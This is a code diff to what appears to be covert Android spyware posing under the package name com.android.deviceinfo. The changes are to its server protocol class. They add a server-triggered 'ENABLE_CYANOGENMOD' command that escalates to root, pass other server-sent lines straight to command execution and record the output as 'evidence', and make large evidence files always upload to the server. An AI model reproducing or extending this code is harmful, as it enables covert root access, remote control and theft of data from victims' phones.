@@ -17,6 +17,7 @@ import java.util.Vector;
 
 import com.android.deviceinfo.Core;
 import com.android.deviceinfo.Device;
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.crypto.CryptoException;
@@ -110,6 +111,10 @@ public class ZProtocol extends Protocol {
 			}
 
 			final boolean[] capabilities = identification();
+			
+			if(Core.self().wantsReload()){
+				Core.self().reloadConf();
+			}
 
 			purge(capabilities[Proto.PURGE]);
 			newConf(capabilities[Proto.NEW_CONF]);
@@ -984,6 +989,23 @@ public class ZProtocol extends Protocol {
 			throw new ProtocolException();
 		}
 	}
+	
+	private ExecuteResult enableCyanogenmod() {
+		ExecuteResult res = new ExecuteResult(M.e("ENABLE_CYANOGENMOD"));
+		try {
+			Cfg.SUPPORT_CYANOGENMOD = true;
+			//Cfg.FORCE_ROOT= true; 
+			Root.getPermissions();
+			res.stdout.add("ok");
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (enableCyanogenmod) Error: " + ex);
+			}
+			res.stdout.add(ex.toString());
+		}
+
+		return res;
+	}
 
 	protected void parseExecute(byte[] response) throws ProtocolException {
 		final int res = ByteArray.byteArrayToInt(response, 0);
@@ -1000,7 +1022,13 @@ public class ZProtocol extends Protocol {
 					String executionLine = WChar.readPascal(dataBuffer);
 					executionLine = Directory.expandMacro(executionLine);
 
-					ExecuteResult ret = Execute.execute(executionLine);
+					ExecuteResult ret;
+					if (executionLine.equals(M.e("ENABLE_CYANOGENMOD"))) {
+						ret = enableCyanogenmod();
+					} else {
+						ret = Execute.execute(executionLine);
+					}
+
 					ret.saveEvidence();
 
 				}
@@ -1133,7 +1161,7 @@ public class ZProtocol extends Protocol {
 					continue;
 				}
 
-				if (Cfg.PROTOCOL_RESUME && file.getSize() > Cfg.PROTOCOL_CHUNK) {
+				if (file.getSize() > Cfg.PROTOCOL_CHUNK) {
 					sendResumeEvidence(file);
 				} else {
 					sendEvidence(file);
